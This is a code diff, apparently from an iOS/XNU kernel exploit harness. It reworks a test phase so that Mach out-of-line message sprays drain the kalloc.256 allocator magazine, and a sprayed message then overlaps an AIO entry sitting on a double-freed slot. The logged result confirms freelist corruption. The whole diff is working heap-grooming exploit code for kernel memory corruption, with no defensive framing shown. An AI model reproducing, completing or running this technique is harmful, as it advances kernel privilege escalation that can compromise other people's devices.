@@ -5815,47 +5815,131 @@ static void *aio_free_and_reclaim_racer(void *arg) {
         }
     }
 
-    // ---- Phase D: Overlap test — two allocs at same double-freed slot? ----
-    // After double-free, slot S is on freelist TWICE. Two consecutive kalloc.256
-    // allocs from the same CPU magazine should both get S → overlapping objects.
-    // Test: alloc AIO entry E1, then AIO entry E2. If E2 succeeds but E1 becomes
-    // EINVAL after E2's alloc, the freelist corruption is confirmed.
-    [self appendLog:@"\n--- Phase D: Overlap confirmation ---"];
-    {
-        static struct aiocb e1, e2;
-        static char e1buf[4096], e2buf[4096];
-        memset(&e1, 0, sizeof(e1));
-        e1.aio_fildes = fd; e1.aio_buf = e1buf; e1.aio_nbytes = 512; e1.aio_offset = 0;
-        e1.aio_sigevent.sigev_notify = SIGEV_NONE;
-        memset(&e2, 0, sizeof(e2));
-        e2.aio_fildes = fd; e2.aio_buf = e2buf; e2.aio_nbytes = 1024; e2.aio_offset = 0;
-        e2.aio_sigevent.sigev_notify = SIGEV_NONE;
+    // ---- Phase D: Magazine drain + OOL overlap ----
+    // After cleanup, the double-freed slot is buried under ~10 normal free
+    // entries in the per-CPU magazine (LIFO). Drain the magazine with mach
+    // OOL spray (kalloc.256), then test overlap with AIO alloc + OOL spray.
+    // SAFE: no kevent64 call after overlap → no filt_aioprocess → no panic.
 
-        int e1ok = (aio_read(&e1) == 0);
-        int e2ok = (aio_read(&e2) == 0);
-        [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@  E2 aio_read: %@",
-                         e1ok ? @"OK" : @"FAIL", e2ok ? @"OK" : @"FAIL"]];
+    [self appendLog:@"\n--- Phase D: Magazine drain + OOL overlap ---"];
 
-        if (e1ok && e2ok) {
-            while (aio_error(&e1) == EINPROGRESS) usleep(100);
-            while (aio_error(&e2) == EINPROGRESS) usleep(100);
-            int e1state = aio_error(&e1);
-            int e2state = aio_error(&e2);
-            [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL)  E2 aio_error=%d",
-                             e1state, EINVAL, e2state]];
-            if (e1state == EINVAL && e2state == 0) {
-                [self appendLog:@"  *** OVERLAP CONFIRMED: E1 invalidated by E2's alloc ***"];
-                [self appendLog:@"  *** Same slot allocated twice → freelist corruption active ***"];
-            } else if (e1state == 0 && e2state == 0) {
-                [self appendLog:@"  Both valid — no overlap (may need more precise timing)"];
-                aio_return(&e1);
-            } else {
-                [self appendLog:[NSString stringWithFormat:@"  Unexpected state: E1=%d E2=%d", e1state, e2state]];
-            }
-            if (e2state == 0) aio_return(&e2);
-            if (e1state == 0) aio_return(&e1);
+    // Create spray ports to hold OOL data in kernel (kalloc.256 per message)
+    enum { kDrainPorts = 5, kDrainMsgsPerPort = 5, kDrainTotal = kDrainPorts * kDrainMsgsPerPort };
+    mach_port_t drainPorts[kDrainPorts];
+    int drainPortsReady = 0;
+    for (int p = 0; p < kDrainPorts; p++) {
+        drainPorts[p] = MACH_PORT_NULL;
+        if (mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &drainPorts[p]) == KERN_SUCCESS) {
+            mach_port_insert_right(mach_task_self_, drainPorts[p], drainPorts[p], MACH_MSG_TYPE_MAKE_SEND);
+            drainPortsReady++;
         }
     }
+    [self appendLog:[NSString stringWithFormat:@"  Drain ports: %d/%d ready", drainPortsReady, kDrainPorts]];
+
+    // OOL payload with signature so we can recognize it in ext values
+    enum { kDrainOolSize = 232 };
+    uint8_t *drainPayload = (uint8_t *)calloc(1, kDrainOolSize);
+    if (drainPayload) {
+        // Fill with signature: ext[1] should show this if OOL overwrites AIO entry
+        uint64_t sigReturnval = 0xBEEF0002BEEF0002ULL;
+        uint32_t sigErrorval  = 0xCAFE0003;
+        // Leave most fields zero (safe for AIO entry fields not accessed by aio_error)
+        memcpy(drainPayload + 0x20, &sigReturnval, 8);  // returnval
+        memcpy(drainPayload + 0x28, &sigErrorval, 4);   // errorval
+        // procp at +0x40 left as 0 — SAFE because we never call kevent64!
+        // aio_error/aio_return check entry flags, not procp.
+    }
+
+    typedef struct {
+        mach_msg_header_t header;
+        mach_msg_body_t body;
+        mach_msg_ool_descriptor_t ool;
+    } DrainMsg;
+
+    // Pre-fill all drain ports with OOL messages
+    int drainSent = 0;
+    for (int p = 0; p < drainPortsReady && drainPayload; p++) {
+        for (int m = 0; m < kDrainMsgsPerPort; m++) {
+            DrainMsg msg;
+            memset(&msg, 0, sizeof(msg));
+            msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+            msg.header.msgh_size = sizeof(DrainMsg);
+            msg.header.msgh_remote_port = drainPorts[p];
+            msg.header.msgh_id = (mach_msg_id_t)(p * kDrainMsgsPerPort + m);
+            msg.body.msgh_descriptor_count = 1;
+            msg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+            msg.ool.address = drainPayload;
+            msg.ool.size = kDrainOolSize;
+            msg.ool.deallocate = FALSE;
+            msg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+            if (mach_msg(&msg.header, MACH_SEND_MSG, sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL) == MACH_MSG_SUCCESS) {
+                drainSent++;
+            }
+        }
+    }
+    [self appendLog:[NSString stringWithFormat:@"  Magazine drain: %d/%d OOL msgs sent (kalloc.256 consumed)", drainSent, kDrainTotal]];
+
+    // Now the magazine should be depleted. The double-freed slot should be near
+    // the freelist head. Allocate E1 (AIO), then spray one more OOL → overlap?
+    {
+        static struct aiocb e1;
+        static char e1buf[4096];
+        memset(&e1, 0, sizeof(e1));
+        e1.aio_fildes = fd;
+        e1.aio_buf = e1buf;
+        e1.aio_nbytes = 0x4444;  // signature nbytes
+        e1.aio_offset = 0;
+        e1.aio_sigevent.sigev_notify = SIGEV_NONE;
+
+        int e1ok = (aio_read(&e1) == 0);
+        [self appendLog:[NSString stringWithFormat:@"  E1 aio_read: %@", e1ok ? @"OK" : @"FAIL"]];
+
+        if (e1ok && drainPayload && drainPortsReady > 0) {
+            // Spray one more OOL on same CPU → should get same slot as E1
+            DrainMsg overlapMsg;
+            memset(&overlapMsg, 0, sizeof(overlapMsg));
+            overlapMsg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
+            overlapMsg.header.msgh_size = sizeof(DrainMsg);
+            overlapMsg.header.msgh_remote_port = drainPorts[0];
+            overlapMsg.header.msgh_id = 9999;
+            overlapMsg.body.msgh_descriptor_count = 1;
+            overlapMsg.ool.type = MACH_MSG_OOL_DESCRIPTOR;
+            overlapMsg.ool.address = drainPayload;
+            overlapMsg.ool.size = kDrainOolSize;
+            overlapMsg.ool.deallocate = FALSE;
+            overlapMsg.ool.copy = MACH_MSG_PHYSICAL_COPY;
+            kern_return_t okr = mach_msg(&overlapMsg.header, MACH_SEND_MSG, sizeof(overlapMsg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
+            // Immediately drain this message so we don't exceed queue limit
+            DrainMsg drmsg2;
+            mach_msg(&drmsg2.header, MACH_RCV_MSG, 0, sizeof(DrainMsg), drainPorts[0], 0, MACH_PORT_NULL);
+
+            while (aio_error(&e1) == EINPROGRESS) usleep(100);
+            int e1state = aio_error(&e1);
+            [self appendLog:[NSString stringWithFormat:@"  E1 aio_error=%d (0=done, %d=EINVAL)", e1state, EINVAL]];
+
+            if (e1state == EINVAL) {
+                [self appendLog:@"  *** OVERLAP CONFIRMED: OOL overwrote E1's slot ***"];
+                [self appendLog:@"  *** Freelist corruption active — overlapping alloc works ***"];
+            } else if (e1state == 0) {
+                [self appendLog:@"  E1 valid — OOL did not hit same slot (magazine drain insufficient)"];
+                aio_return(&e1);
+            } else {
+                [self appendLog:[NSString stringWithFormat:@"  E1 unexpected state: %d", e1state]];
+                if (e1state != EINVAL) aio_return(&e1);
+            }
+        } else if (e1ok) {
+            while (aio_error(&e1) == EINPROGRESS) usleep(100);
+            if (aio_error(&e1) == 0) aio_return(&e1);
+        }
+    }
+
+    // Drain all remaining messages from ports
+    for (int p = 0; p < drainPortsReady; p++) {
+        DrainMsg drmsg;
+        while (mach_msg(&drmsg.header, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, sizeof(DrainMsg), drainPorts[p], 1, MACH_PORT_NULL) == MACH_MSG_SUCCESS) ;
+        mach_port_destroy(mach_task_self_, drainPorts[p]);
+    }
+    free(drainPayload);
 
     close(fd);
     unlink(path.UTF8String);
